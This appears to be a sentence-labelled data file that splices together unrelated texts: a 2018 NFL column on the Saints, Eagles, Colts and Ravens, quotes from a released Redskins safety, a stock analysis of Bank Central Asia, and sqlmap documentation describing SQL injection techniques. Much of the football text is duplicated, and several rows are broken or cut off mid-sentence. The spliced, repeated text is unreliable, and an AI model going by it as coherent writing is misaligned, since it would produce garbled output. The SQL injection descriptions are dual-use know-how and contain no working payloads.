"Three months later that mission is on track, with the finish line in sight.",-1,0
"And again, it was a critical play from the best receiver Drew Brees has ever played with that inched the Saints closer to that destination.",-1,0

"Whether Thomas, as he came back to it, overran the goal line and left the end zone before putting the ball away.",-1,0

"I definitely knew my feet were in but the ref was playing me right there [on the line], Thomas said over the phone from the Saints locker room last night.",-1,0

"Theres still plenty of work to do, but what Thomas sees now is a lot of that promise of September turning into production, on both a personal and a team level.",-1,0

"But were starting in the Superdome, since we now know that the road to Atlanta, on the NFC sides, runs through there.",-1,0
"These arent the Saints of mid-November.",-1,0
"There have been bumps since then.",-1,0
"The Cowboys effectively took them into a dark alley and out of their element on Nov. 29, winning a 13-10 struggle during which the Saints could muster only 176 yards of total offense.",-1,0
"The next week, in Tampa, Brees and company were down 14-3 to the Bucs at halftime.",-1,0
"And last Monday he Saints were held out of the end zone until the second half again before grinding out a 12-9 win over the Panthers.",-1,0
"The good news?",-1,0
"The Saints took two of those three games, and those were won in a fashion that not every Payton/Brees team would be capable of riding to victory.",-1,0
"They rushed for more than 100 yards and held the opponent under 300 total yards in both wins, which was more than enough against the Bucs, and just enough in Charlotte.",-1,0
"We went to Dallas, that was our third game in 11 days, Thomas said.",-1,0
"And then we went on the road to playtwo games against divisional opponents who know us very well, who we play against a lot.",-1,0
"Its tough game.",-1,0
"Its all about how you respond.",-1,0
"The Saints passing offense finally did respond against the Steelers, when the team needed it most.",-1,0
"New Orleans, in fact, watched a 24-14 lead in the third quarter quickly melt into a 28-24 deficit, and so on Sunday, after three straight rock fights, theyd need to be in more than just survival mode.",-1,0

"We dont play this game, we dont prepare the way we do to not get better.",-1,0

"It gives us the  ability to do some different things.",-1,0
"And were just playing for one another.",-1,0
"Coach told us it will be a playoff atmosphere game, and we responded.",-1,0
"While they wouldnt necessarily sign up again for what they just battled through, the Saints do believe theyre better for it.",-1,0
"The defense hasnt allowed a fourth-quarter point in a month, largely because thats what it needed to do over the last four games.",-1,0
"Theyre more physical on offense, too, because theyve had to lean on the run game more.",-1,0
"All of which should serve the Saints well.",-1,0
"As will, at least on paper, the fact that New Orleans can treat its Week 17 game against the Panthers however it wants to treat it, and head forward with home-field throughout the NFC playoffs.",-1,0
"JONES:The Steelers Look Like Pretenders
Weve held the No.1 seed for a couple times this year, Thomas said.",-1,0
"We knew teams were going to give us our best shot.",-1,0
"We were playing desperate teams that were going to come here and try to beat us.",-1,0
"We just couldnt fold and now we actually get a chance to take deep breath, and get a little bit of time to rest up now.",-1,0
"Its been a hard-fought season, and now its time to take it up another another notch.",-1,0
"I asked Thomas if he wants to play next week, and he intimated that hed like to break Joe Horns franchise record for single-season receiving yardshes 23 yards off the mark of 1,399.",-1,0

"That leaves two teams battling over one piece of bracket real estateand those two just so happen to be the two that went head-to-head in the NFC title game 11 months ago.",-1,0
"And if Im Philly this morning, two things are making me feel like its 2017 all over again.",-1,0
"The first, and obvious, is how the team has rallied around Nick Foles the last two weeks.",-1,0
"Foles was pretty good in the win over the Rams eight days ago (24-31, 270 yards, one INT), and pretty great in helping stave off a furious Texans comeback on Sunday (35-49, 471 yards, four TDs, one INT) in a 32-30 win.",-1,0
"Nick has shown these past two years that hes not a backup quarterback, tight end Zach Ertz told me Sunday night.",-1,0
"Hes not a backup-caliber quarterback.",-1,0
"When hes in the game on offense leading us at quarterback, the offense isnt going to change very much.",-1,0
"We got two extremely talented signal callers back there, and its Nicks turn right now to kind of carry us on our offense.",-1,0
"Carry the Eagles, Foles did.",-1,0
"On the games decisive drive, he made two big-time throws to convert a pair of third-and-10s.",-1,0
"On the first one, from his own 11, he stood in and took a shot from Houstons Jadeveon Clowney as he delivered 19-yard strike to Alshon Jeffery.",-1,0
"On the second one, Ertz slipped past the defense off a scissors concept, and Foles found him for 20 yards to set up Jake Elliotts game-winner.",-1,0
"Nick battled his butt off tonight, Ertz said.",-1,0
"And that brings us to the other 2017-ish element you saw on Sunday.",-1,0
"The Eagles first two touchdowns came onyou guessed itfourth down.",-1,0
"The first was on fourth-and-2 from the Philly 37.",-1,0
"Darren Sproles took a swing pass and made two defenders miss on the way to the end zone.",-1,0
"The second was on fourth-and-goal from the 1, with Ertz slipping underneath coverage out of a bunch formation for the score.",-1,0
"Doug [Pederson], when hes aggressive like that and he puts the trust in us as players, its like, Man, this guy truly believes that were going to execute over and over again, Ertz said.",-1,0
"And I think that just allows us to play with such a confidence, a swagger almost, because we have a coach whos willing to bet on us.",-1,0
"So we should play with that same confidence, if not more.",-1,0
"And the defensive guys see it the same waythat their coach is willing to take the risk in those situations knowing that hes backstopped by a unit he trusts.",-1,0
"If we dont get [the first down], then we got go and fight for that field position back and try to get a sack or TFL, just try to get a turnover depending on where the balls at, defensive tackle Fletcher Cox said just after the game.",-1,0
"So we just stay calm and if we dont get it we go out and try to get the offense the ball back quick.",-1,0
"Similarly, the offense picked up the defense after Deshaun Watson guided the Texans back from a 29-16 deficit.",-1,0
"And that gave Elliott the chance to make up for the missed extra point that put Philly in that precarious spotdown 30-29 lateto begin with.",-1,0
"The downside for the Eagles?",-1,0
"They still dont control their destiny.",-1,0
"Should the Vikings win against the Bears on Sunday, Philly wont make the playoffs.",-1,0
"And maybe thatd be a shamebut for right now they cant get wrapped up in it.",-1,0
"We dont control our own destiny and thats unfortunate, Ertz said.",-1,0
"This is the bed that weve laid in.",-1,0
"But we were 4-6 coming off a real bad loss to the Saints, and a lot of guys wouldve kind of thrown in the towel, and it was the exact opposite.",-1,0
"Guys rallied.",-1,0
"Guys got back to work.",-1,0
"We practiced extremely hard all year, and after that game against the Saints we just got back to work.",-1,0
"No one panicked.",-1,0
"No one was pointing fingers.",-1,0
"We just said, Hey, we got to flip the switch, we got to be playing our best football late in the year.",-1,0
"They are now.",-1,0
"Well see if its too late.",-1,0
"Its been pretty well-established in Indy for some time that Andrew Luck is back to being Andrew Luck, but there are still nice signs along the way.",-1,0
"And Sunday gave the Colts brass one of those glimpses in the biggest of moments.",-1,0
"On first-and-goal with 59 seconds left, and the Colts down 27-21, Reich sent a run play in.",-1,0
"Luck got to the line.",-1,0
"He quickly diagnosed the Giants defensetight man-to-man coverage, allowing for extra defenders in the box.",-1,0
"He immediately mentally flipped to Indys attacker family of plays, man-coverage-beating concepts built for the situation at hand.",-1,0
"He then checked to a play designed to go to Chester Rogers.",-1,0
"The call had T.Y.",-1,0
"Hilton wide left, with Rogers in the slot.",-1,0
"At the snap, Hilton broke inside and got in Giants corner Grant Haleys way, which freed Rogers into the flat.",-1,0
"And from there, it was candy from a baby.",-1,0
"Luck dropped the balll into Rogers hands, and the Colts were ahead.",-1,0
"A pick of Eli Manning on the Giants final drive sealed the win.",-1,0
"Just as significant?",-1,0
"How Luck really has become an extension of Reich.",-1,0
"Now that hes physically OK, thats where the strides keep coming for the Colts quarterback.",-1,0
"Hes like a coach out there, Reich told me a couple hours after the game.",-1,0
"We have such good communication and belief in what were doing.",-1,0
"When we have time to talk about things in between, we can talk to him about two or three plays.",-1,0
"Get his preferences, talk things through, if were going to check to something.",-1,0
"And just as Lucks come along, so have the Colts.",-1,0
"They started 1-5.",-1,0
"Theyve gone 8-1 since.",-1,0
"But this isnt just about the quarterback, great as hes been.",-1,0
"Weve talked a lot over the last few weeks about the reclamation of the offensive line, and the bumper crop of 2018 draft picks, and the money the Colts will have to spend in 2019.",-1,0
"In short, theyre as well as positioned for the future as anyone in the league.",-1,0
"What they are now is a team that can win in a bunch of different ways.",-1,0
"Against Dallas in Week 15, it was with an overwhelming running game and defense, with Luck playing caretaker.",-1,0
"This week the quarterback threw for 357 yards and guided Indy back from a 10-point deficit in the second half.",-1,0
"When you look over the years at the good football teams, theyll able to win different kinds of games, Reich said.",-1,0
"Low-scoring games, high-scoring games, games you got to come from behind, games youve got to hold the ball.",-1,0
"And so this stretch that were on, were hitting a variety of those types of wins.",-1,0
"And I do think [winning those is] a good sign.",-1,0
"It alls sets up an awesome Week 17 in the AFC South.",-1,0
"The Texans, who are already in the playoffs, win the division if they can beat Jacksonville.",-1,0
"If that doesnt happen, the winner of Colts-Titans takes the South.",-1,0
"And at this point, its safe to say the arrows pointing up on three of the four AFC South team.",-1,0
"The Jags are the exception, which few wouldve seen coming just a few months ago.",-1,0
"The Ravens decision to stick with coach John Harbaugha smart decisioncan give everyone a window into the internal debate that some teams are having as it comes time for struggling franchises to make calls on their future.",-1,0
"There was a time a couple months ago when most of the league assumed Harbaugh and the Ravens were driving towards a separation, however you wanted to term that, following this, his 11th season as coach in Baltimore.",-1,0
"But as the team got hot, upper management started asking a very simple, sensical question: In a year when the pool of candidates is shallow, why are we going to walk away from the man wholl be the No.",-1,0
"1 candidate on most teams lists?",-1,0
"There was no shortage of teams that had an interest in Harbaugh.",-1,0
"The Jets were one.",-1,0
"The Broncos were another.",-1,0
"And it was never hard to see why.",-1,0
"Harbaugh made the playoff six times in his first decade with the Ravens, winning at least once in the postseason in each of those seasons, while taking home a Super Bowl title in 2012.",-1,0
"So Baltimore decided over the last week that, at the very least, theyre not going to just let him walk.",-1,0
"Which is wise of them, in the same way its wise of other teams to make sure theyre happy with whats out there in the marketplace before deciding to sever ties with the coach theyve got now.",-1,0
"And theres also the way that Harbaugh handled the situation with his players when the rumblings really got going.",-1,0
"Veteran safety Eric Weddle explained that the coach told them hed been in contact with owner Steve Bisciotti throughout and that, while he wasnt certain of his own future, they didnt need to worry about him.",-1,0
"He then told the players, Im with you and Im for you.",-1,0
"Its nice to put it to rest, Weddle said via text late Saturday, after the Ravens beat the Chargers in Los Angeles.",-1,0
"Hes been very up front and honest with us, and hes done an amazing job keeping us together, to have us in the position were in right now.",-1,0
"Its how honest hes been and how hes believed from Day 1.",-1,0
"His love and belief really have resonated through the entire team.",-1,0
"Maybe the biggest compliment the players could give Harbaugh, though, came in how they played against the Chargersbecause it completely reflected their coachs vision for a program and a team.",-1,0
"Against another pretty physical group, Baltimore controlled the line on scrimmage, nearly doubling up the Chargers in scrimmage yards (361-198) and tripling them on the ground (159-51).",-1,0
"It also showed up in how Baltimore wound up breaking their hostspunching the ball out lateand also in how the Ravens handled the circumstance of traveling cross-country on a short week to play a really good team coming off nine days rest.",-1,0
"Afterwards, Harbaugh told the players that the Ravens are a strong, butt-kicking outfit, and gave the game ball to strength coach Steve Saunders.",-1,0
"But the guys in the locker room know that reaching this pointa win against Cleveland next Sunday and theyre division champs, something that seemed out of the question midway through the seasonhas had as much to do with the guy whos setting their course.",-1,0
"One-hundred percent, Weddle said.",-1,0
"We want to hit people in the mouthphysical in all three phases, make em quit in the fourth.",-1,0
"Thats pretty much how it played out, and the Ravens organization signed up for more of it.",-1,0
"So with that theme as the backdrop, and seven days ahead of Black Monday, some nuggets from the rumor mill:
Panthers GM Marty Hurney has built a good rapport with new owner David Tepper, Im told, and so he and coach Ron Rivera are very likely to get at least another year.",-1,0
"I dont think its out of the realm of possibility that someone could be added to football ops.",-1,0
"Teppers shown a keen awareness in the area of football analytics, so maybe thats where a hire is made.",-1,0
"At the very least, with offensive coordinator Byron Leftwich not quite ready for the role he was thrust into in October, the Cardinals will make major changes to its offensive staff.",-1,0
"And theres a pretty decent chance that owner Michael Bidwill goes beyond just that.",-1,0
"First-year coach Steve Wilks is in peril.",-1,0
"It remains to be seen whether or not GM Steve Keim is, too.",-1,0
"If Keim is out in Arizona, word is that hell be a top candidate for the GM job with the Raiders, who would prefer to bring in an experienced personnel man.",-1,0
"The Buccaneers are a little like Arizona in that word has held that the coach, Dirk Koettter, is likely to be gone, particularly with a staff full of assistants on expiring deals, but the situation of GM Jason Licht seems to be murkier.",-1,0
"This job is the one that ex-Packers coach Mike McCarthy has been connected most to.",-1,0
"The Dolphins will almost certainly have change at some level.",-1,0
"Id be surprised if both EVP Mike Tannenbaum and coach Adam Gase are back, and a total blowup is not out of the question.",-1,0

"On Coach Jay Gruden telling him he had been released: I asked him why; he didnt give me an explanation.",-1,0

"The last conversation we had, never in a million years would I have thought Id be released .",-1,0
".",-1,0
".",-1,0
"I was just like, Oh wow, why?",-1,0
"And he didnt say anything.",-1,0
"I guess he didnt have an answer or respond; he just wanted to release me and that was that.",-1,0
"There wasnt no explanation on why.",-1,0
"He just said this is the third time Ive been in his office and were going to release you and that was that.",-1,0
"On whether he wasnt a fan of defensive coordinator Greg Manuskys play-calling: I wouldnt say that because in the past weve made plays in the things that hes called.",-1,0
"My only issue was a few tweaks here and there that could make us better and get guys making more plays on the ball.",-1,0
"That was my only issue.",-1,0
"It wasnt about the scheme or this or that.",-1,0
"There was just times that, from a players perspective, we could be better in certain situations.",-1,0
"Like I said, on third-and-seven, I would have zone eye so we could see the quarterback.",-1,0
"If Im wrong for that, then Ive got to deal with the consequences.",-1,0
"And the consequences are me being released, so Im fine with that.",-1,0

"This year, I thought I improved on everything.",-1,0
"And I get a slap in the face and get released, so you never know what could be said on top of whats going on.",-1,0
"But on my end, I knew I gave it my all and put my heart into it every single week trying to do the best I could to win games and get into the playoffs.",-1,0

"[Redskins cut safety D.J.",-1,0
"Swearinger after critical comments about coaching staff]
On Gruden as a head coach: You know, Jay, hes a players' coach.",-1,0

"It can go the players love him We want to play for you or it can go to a Man were not getting enough work.",-1,0
"And if we are doing the things that we do mediocre-wise or practicing light, then certain things like the playoffs are just not going to happen for certain.",-1,0
"On whether the Redskins need to work harder in practice: Man, Im not a Redskin anymore.",-1,0
"Like I said, Ive been on a team that has went to the playoffs, and [Ive been on a team that] went 3-13 and I know the formula that Bruce Arians had [with the Arizona Cardinals].",-1,0
"And it was a successful formula.",-1,0
"We practiced 10 times harder than we did here.",-1,0
"You know, its kind of crazy that every time a player that comes here from another team, theyre like Man, this is so laid-back.",-1,0
"But I guess thats just what type of practices we have: We have laid-back practices.",-1,0
"Every teammate of my old that comes here, they ask me Damn, bro, why is practice so laid-back, why are we just chillin out here?'",-1,0
"But I guess thats just the formula that this team has.",-1,0
"And it would be less of a man of me to stoop down to the mediocre when Im not a mediocre guy.",-1,0
"I dont like practicing mediocre, I dont like preparing mediocre.",-1,0
"And thats sort of the thing I guess that hurt me and got me released, but if thats the type of man that I am, to not accept mediocre, then I can live with that.",-1,0
"I can live with being released and live with wanting to win and be a winner.",-1,0
"I can live with it.",-1,0
"On Jonathan Allen tweeting his support for Manusky: I play defensive back, watch a lot of film.",-1,0
"When you play D line not taking anything from Allen, he plays D line, hes in his second year all they have to do is rush and get the quarterback or stop the run.",-1,0
"Its a different mind-set when you talk about a DB thats been in the game for a while and a D lineman that hasnt been in the game for a while.",-1,0
"The DBs and the linebackers, er play a lot of coverage; nine times out of 10, the D line, they rush so they may not know whats going on in the back end.",-1,0
"I guess hes a young player and he doesnt really know about calls in the back end and, you know, he said the right thing.",-1,0
"He said Greg Manusky called a good [game].",-1,0
"He had a great game, Jonathan Allen had a great game.",-1,0
"And why wouldnt he say that after he had a great game?",-1,0
"If he has a great game, then of course hes going to say [Manusky] called a good game.",-1,0
"But like I said, he doesnt play in the coverage, he doesnt play in the back, he never knows whats going on in the back end.",-1,0
"So for him to say that, hes taking up for his D coordinator, as he should.",-1,0

".",-1,0
".",-1,0
"I do know for a fact that I was named one of the captains and one of my teammates' votes did put me ahead of [a] three-way tie and it was the coachs decision to not name me the [defensive] captain.",-1,0
"This is the first team Ive been on where we only have three captains.",-1,0
"Everywhere else Ive been weve had four or five captains.",-1,0
"But this is the first year of my six-year career that we only have three captains.",-1,0
"So that was ironic, and you could read between those lines.",-1,0
"Its not rocket science on why I wasnt the captain.",-1,0
"Im a vocal guy, a passionate guy that wants to win, and if the coaches feel like Im too smart or Im a weapon as far as my smarts are concerned and to ignore what things are going wrong or not going well then they got to release the guy that has knowledge or has respect in the locker room, I guess.",-1,0
"On how receptive coaches were to feedback: My defensive backs coach, he understood everything.",-1,0

"Asking them, Hey Coach, what do you think about this coverage?",-1,0
"If we run this coverage well be able to stop the run, well be able to stop the pass.",-1,0

"On what he would do as a coach if a player called him out: I would go to the player, talk to the player, get him to understand that Okay, well we dont like this or like that, and if that doesnt work, well just tell the media hey, you cant interview this guy.",-1,0
"We dont want this guy interviewed.",-1,0
"Because thats something that Ive said, Ive said in the past, Hey coach, if you dont like the things that I said, hey man, just tell them to stop interviewing me, bro, because the only thing I know is 100 percent truth and being real.",-1,0
"So if you dont want me being interviewed, if you dont want these people hearing what I got to say, just tell these people to stop interviewing me and keep me away from the media.",-1,0

"Bank Central Asia (OTCPK:PBCRY) has long been one of the leading Indonesian Banks.",-1,0
"Its lower-than-peers cost of funds, and consequentially higher Net Interest Margin, along with its industry leading low NPL ratio is largely the reason for its outperformance on the local market this past year.",-1,0
"Whilst the majority of Indonesian banks saw their share prices decline throughout the year Bank Central Asia is up by around 20% this year.",-1,0
"Despite the bank clearly being of great quality some concerns arise over its current valuation.",-1,0
"This article therefore aims to analyse the strengths and weaknesses of this bank with the overall view of determining whether it could potentially be worth it for investors to dip their toes in the water on this stock at current levels.",-1,0
"Emerging Market Sentiment and Macro Conditions
Earlier this year when the Central Bank of Indonesia raised its benchmark interest rate it sent a message to the market that the central bank could raise rates further if the currency comes under strain.",-1,0
"This had some investors spooked as growth in South Asian nations, such as Indonesia, is driven largely by domestic demand as opposed to the export-oriented growth in North Asia.",-1,0
"Too rapidly rising interest rates therefore posed a risk of dampening consumer and business confidence and accordingly economic growth.",-1,0
"As the market increasingly expects the Fed to slow the pace of its rate hikes in 2019, investors saw the potential for rate hikes in Indonesia decline as well and re-entered the market in droves.",-1,0
"The recent remarks by Jerome Powel, the Chairman of the Federal Reserve, was considered by many not to be dovish enough.",-1,0
"If the Fed therefore continues to hike rates at the same pace as previously anticipated the Indonesian Central Bank may have to follow suit.",-1,0
"In this eventuality there is a risk of renewed sell-off in the Indonesian market.",-1,0
"This risk is particularly high in the Indonesian market where around 40% of all domestic bonds are owned by foreign investors.",-1,0
"The Impact of a Rate Hike, Asset Quality, and Capital
Such sell-off could affect all Indonesian stocks irrespective of the underlying fundamentals of the company.",-1,0
"This is therefore a risk investors should remain vigilant of even in the high-quality stocks such as Bank Central Asia.",-1,0
"From a fundamentals perspective, Bank Central Asia is amongst the Indonesian banks who will be impacted the least by a rate hike.",-1,0
"Although rising rates are generally considered to be positive for banks it is often the case only after crossing a certain threshold and does not hold true universally.",-1,0
"DBS expects that a 25-basis point rate hike would currently bring about a 5-basis point decline in the average NIM of the Indonesian Banking sector as their Cost of Funds, otherwise known as COF, increases.",-1,0
"The decline for Bank Central Asia will, however, be much lower given its industry leading CASA ratio.",-1,0
"DBS estimates that a 25-basis point rate hike would result in a 2.9-basis point increase in the banks COF and a 2.6-basis point decline in its NIM.",-1,0
"A decrease in NIM could never be considered a positive factor but this projected decline is clearly not catastrophic for a bank which currently enjoys a NIM of around 5.1%.",-1,0
"Bank Central Asia has also long maintained the lowest NPL ratio of the major Indonesian banks.",-1,0
"Its NPL ratio is currently at 1.4% and has been steadily improving since the Indonesian banks saw their NPLs peak in 2016.",-1,0
"The risk of the Indonesian credit cycle peaking is also therefore currently much lower than that of other nations.",-1,0

"It also expects loan growth to accelerate to around 10-12%.",-1,0
"This robust loan growth will certainly benefit Bank Central Asia although it may be lower if interest rates rise too rapidly.",-1,0
"The strong capital position of the Indonesian banking sector is also noteworthy.",-1,0
"Bank Central Asias Capital Adequacy Ratio at 23.2% is the highest of the major Indonesian banks and above the sector average of around 22%.",-1,0
"Its strong and continued internal capital generation along with this strong capital position makes the likelihood of the bank needing to resort to a dilutive capital raise seem highly unlikely.",-1,0
"Its strong capital position along with the banks industry leading funding mix and low Loan to Deposit ratio also positions it well to take advantage of any pickup in loan demand.",-1,0
"Earnings Outlook
Bank Central Asia reported a 17.3% YoY growth in loans outstanding in the third quarter of 2018 which was significantly higher than the banking sectors total loan growth of around 12.1%.",-1,0
"In pursuing this higher loan growth, the bank allowed its Loan to Deposit Ratio to increase by a significantly higher margin than it had in previous years.",-1,0

A strong liquidity buffer had long been one of the banks key drawing factors for investors wherefore investors in Bank Central Asia should monitor these changes on an ongoing basis.",-1,0
"The increase in the LDR was also partially driven by a decline in time deposits.",-1,0
"Time deposits declined by around 9.2% whilst Current Account and Savings Account, otherwise known as CASA, deposits grew by around 11.2% YoY and total deposits by 6.9% YoY.",-1,0
"The bank is likely to continue focusing on strong CASA growth going forward as this is the banks cheapest source of funds.",-1,0
"The banks LDR also remains the lowest of the major Indonesian banks and still has some room for further increase without eliminating its strong liquidity buffer provided it does not cross the 87-90% range.",-1,0
"The bank also reported a 9.9% YoY increase in Net Profit whilst maintaining its industry leading Return on Assets.",-1,0
"Its ROA increased by 10-basis points YoY to reach 3.9% at a time when many other Indonesian banks saw their ROA decline.",-1,0
"Its ROE for FY2018 is also expected to come in at around 18.3% which is rivalled only by the 18.5% expected for Bank Rakyat Indonesia (OTCPK:BKRKY).",-1,0
"With its strong deposit base and increased investment in mobile banking, Bank Central Asia is likely to continue displaying reasonable growth rates.",-1,0
"This is in a country where only around half of the population are banked but more than 75% own a mobile phone.",-1,0
"Bank Central Asia along with Bank Rakyat Indonesia currently have the most complete range of digital banking products and services, from conventional internet banking to quick response (QR) code payment applications.",-1,0
"The continued growth in CASA deposits relative to its overall funding mix will also help the bank to maintain its low COF and further strengthen its competitive position.",-1,0
"Valuation and Conclusion
Bank Central Asia is currently trading at a forward P/E ratio of around 24.9 which is the highest of the major Indonesian banks.",-1,0
"Its forward price to book value at around 4.29 is also the highest of the major Indonesian banks and partially driven by the banks long history of strong book value growth.",-1,0

Despite the banks superior ROE, ROA and strong book value growth I remain somewhat concerned that the premium on the stock price is currently too steep.",-1,0
"Whilst the bank will deservedly likely to continue trading at a premium to its peers in my view it should not trade at a premium of more than 10% on P/B to peers such as Bank Rakyat Indonesia which has similarly shown strong growth and maintained a high ROE.",-1,0
"The premium to Bank Rakyat then being justified largely by Bank Central Asias superior deposit mix.",-1,0

It can therefore be said that long term investors seeking exposure to high growth emerging markets such as Indonesia could be well served by holding this bank in their portfolio.",-1,0
"The current valuation is, however, somewhat high wherefore I would not personally initiate a full position at this point of time.",-1,0

sqlmap is able to detect and exploit five different SQL injection types:

pages.",-1,0
"The bisection algorithm implemented in sqlmap to perform this
technique is able to fetch each character of the output with a maximum
of seven HTTP requests.",-1,0
"Where the output is not within the clear-text plain charset, sqlmap
will adapt the algorithm with bigger ranges to detect the output.",-1,0
"Time-based blind:
sqlmap replaces or appends to the affected parameter in the HTTP
request, a syntactically valid SQL statement string containing a query
which put on hold the back-end DBMS to return for a certain number of
seconds.",-1,0
"For each HTTP response, by making a comparison between the HTTP
response time with the original request, the tool inference the output
of the injected statement character by character.",-1,0
"Like for boolean-based
technique, the bisection algorithm is applied.",-1,0
"Error-based:
sqlmap replaces or appends to the affected parameter a
database-specific error message provoking statement and parses the HTTP
response headers and body in search of DBMS error messages containing
the injected pre-defined chain of characters and the subquery statement
output within.",-1,0
"This technique works only when the web application has been
configured to disclose back-end database management system error
messages.",-1,0
"UNION query-based:
sqlmap appends to the affected parameter a syntactically valid SQL statement starting with an UNION ALL SELECT.",-1,0
"This technique works when the web application page passes directly the output of the statementSELECT within a for loop, or similar, so that each line of the query output is printed on the page content.",-1,0
"sqlmap is also able to exploit partial (single entry) UNION query SQL injection vulnerabilities which occur when the output of the statement is not cycled in a for construct, whereas only the first entry of the query output is displayed.",-1,0
"Stacked queries:
also known as piggy backing:
sqlmap tests if the web application supports stacked queries and then,
in case it does support, it appends to the affected parameter in the
HTTP request, a semi-colon (;) followed by the SQL statement to be executed.",-1,0
"This technique is useful to run SQL statements other than SELECT, like for instance, data definition or data manipulation

"They rushed for more than 100 yards and held the opponent under 300 total yards in both wins, which was more than enough against the Bucs, and just enough in Charlotte.",-1,0
"We went to Dallas, that was our third game in 11 days, Thomas said.",-1,0
"And then we went on the road to playtwo games against divisional opponents who know us very well, who we play against a lot.",-1,0

"JONES:The Steelers Look Like Pretenders
Weve held the No.1 seed for a couple times this year, Thomas said.",-1,0

"And if Im Philly this morning, two things are making me feel like its 2017 all over again.",-1,0
"The first, and obvious, is how the team has rallied around Nick Foles the last two weeks.",-1,0
"Foles was pretty good in the win over the Rams eight days ago (24-31, 270 yards, one INT), and pretty great in helping stave off a furious Texans comeback on Sunday (35-49, 471 yards, four TDs, one INT) in a 32-30 win.",-1,0
"Nick has shown these past two years that hes not a backup quarterback, tight end Zach Ertz told me Sunday night.",-1,0
"Hes not a backup-caliber quarterback.",-1,0
"When hes in the game on offense leading us at quarterback, the offense isnt going to change very much.",-1,0
"We got two extremely talented signal callers back there, and its Nicks turn right now to kind of carry us on our offense.",-1,0
"Carry the Eagles, Foles did.",-1,0
"On the games decisive drive, he made two big-time throws to convert a pair of third-and-10s.",-1,0
"On the first one, from his own 11, he stood in and took a shot from Houstons Jadeveon Clowney as he delivered 19-yard strike to Alshon Jeffery.",-1,0
"On the second one, Ertz slipped past the defense off a scissors concept, and Foles found him for 20 yards to set up Jake Elliotts game-winner.",-1,0
"Nick battled his butt off tonight, Ertz said.",-1,0
"And that brings us to the other 2017-ish element you saw on Sunday.",-1,0
"The Eagles first two touchdowns came onyou guessed itfourth down.",-1,0
"The first was on fourth-and-2 from the Philly 37.",-1,0
"Darren Sproles took a swing pass and made two defenders miss on the way to the end zone.",-1,0
"The second was on fourth-and-goal from the 1, with Ertz slipping underneath coverage out of a bunch formation for the score.",-1,0
"Doug [Pederson], when hes aggressive like that and he puts the trust in us as players, its like, Man, this guy truly believes that were going to execute over and over again, Ertz said.",-1,0
"And I think that just allows us to play with such a confidence, a swagger almost, because we have a coach whos willing to bet on us.",-1,0
"So we should play with that same confidence, if not more.",-1,0
"And the defensive guys see it the same waythat their coach is willing to take the risk in those situations knowing that hes backstopped by a unit he trusts.",-1,0
"If we dont get [the first down], then we got go and fight for that field position back and try to get a sack or TFL, just try to get a turnover depending on where the balls at, defensive tackle Fletcher Cox said just after the game.",-1,0
"So we just stay calm and if we dont get it we go out and try to get the offense the ball back quick.",-1,0
"Similarly, the offense picked up the defense after Deshaun Watson guided the Texans back from a 29-16 deficit.",-1,0
"And that gave Elliott the chance to make up for the missed extra point that put Philly in that precarious spotdown 30-29 lateto begin with.",-1,0
"The downside for the Eagles?",-1,0
"They still dont control their destiny.",-1,0
"Should the Vikings win against the Bears on Sunday, Philly wont make the playoffs.",-1,0
"And maybe thatd be a shamebut for right now they cant get wrapped up in it.",-1,0
"We dont control our own destiny and thats unfortunate, Ertz said.",-1,0
"This is the bed that weve laid in.",-1,0
"But we were 4-6 coming off a real bad loss to the Saints, and a lot of guys wouldve kind of thrown in the towel, and it was the exact opposite.",-1,0
"Guys rallied.",-1,0
"Guys got back to work.",-1,0
"We practiced extremely hard all year, and after that game against the Saints we just got back to work.",-1,0
"No one panicked.",-1,0
"No one was pointing fingers.",-1,0
"We just said, Hey, we got to flip the switch, we got to be playing our best football late in the year.",-1,0
"They are now.",-1,0
"Well see if its too late.",-1,0
"Its been pretty well-established in Indy for some time that Andrew Luck is back to being Andrew Luck, but there are still nice signs along the way.",-1,0
"And Sunday gave the Colts brass one of those glimpses in the biggest of moments.",-1,0
"On first-and-goal with 59 seconds left, and the Colts down 27-21, Reich sent a run play in.",-1,0
"Luck got to the line.",-1,0
"He quickly diagnosed the Giants defensetight man-to-man coverage, allowing for extra defenders in the box.",-1,0
"He immediately mentally flipped to Indys attacker family of plays, man-coverage-beating concepts built for the situation at hand.",-1,0
"He then checked to a play designed to go to Chester Rogers.",-1,0
"The call had T.Y.",-1,0
"Hilton wide left, with Rogers in the slot.",-1,0
"At the snap, Hilton broke inside and got in Giants corner Grant Haleys way, which freed Rogers into the flat.",-1,0
"And from there, it was candy from a baby.",-1,0
"Luck dropped the balll into Rogers hands, and the Colts were ahead.",-1,0
"A pick of Eli Manning on the Giants final drive sealed the win.",-1,0
"Just as significant?",-1,0
"How Luck really has become an extension of Reich.",-1,0
"Now that hes physically OK, thats where the strides keep coming for the Colts quarterback.",-1,0
"Hes like a coach out there, Reich told me a couple hours after the game.",-1,0
"We have such good communication and belief in what were doing.",-1,0
"When we have time to talk about things in between, we can talk to him about two or three plays.",-1,0
"Get his preferences, talk things through, if were going to check to something.",-1,0
"And just as Lucks come along, so have the Colts.",-1,0
"They started 1-5.",-1,0
"Theyve gone 8-1 since.",-1,0
"But this isnt just about the quarterback, great as hes been.",-1,0
"Weve talked a lot over the last few weeks about the reclamation of the offensive line, and the bumper crop of 2018 draft picks, and the money the Colts will have to spend in 2019.",-1,0
"In short, theyre as well as positioned for the future as anyone in the league.",-1,0
"What they are now is a team that can win in a bunch of different ways.",-1,0
"Against Dallas in Week 15, it was with an overwhelming running game and defense, with Luck playing caretaker.",-1,0
"This week the quarterback threw for 357 yards and guided Indy back from a 10-point deficit in the second half.",-1,0
"When you look over the years at the good football teams, theyll able to win different kinds of games, Reich said.",-1,0
"Low-scoring games, high-scoring games, games you got to come from behind, games youve got to hold the ball.",-1,0
"And so this stretch that were on, were hitting a variety of those types of wins.",-1,0
"And I do think [winning those is] a good sign.",-1,0
"It alls sets up an awesome Week 17 in the AFC South.",-1,0
"The Texans, who are already in the playoffs, win the division if they can beat Jacksonville.",-1,0
"If that doesnt happen, the winner of Colts-Titans takes the South.",-1,0
"And at this point, its safe to say the arrows pointing up on three of the four AFC South team.",-1,0
"The Jags are the exception, which few wouldve seen coming just a few months ago.",-1,0
"The Ravens decision to stick with coach John Harbaugha smart decisioncan give everyone a window into the internal debate that some teams are having as it comes time for struggling franchises to make calls on their future.",-1,0
"There was a time a couple months ago when most of the league assumed Harbaugh and the Ravens were driving towards a separation, however you wanted to term that, following this, his 11th season as coach in Baltimore.",-1,0
"But as the team got hot, upper management started asking a very simple, sensical question: In a year when the pool of candidates is shallow, why are we going to walk away from the man wholl be the No.",-1,0
"1 candidate on most teams lists?",-1,0
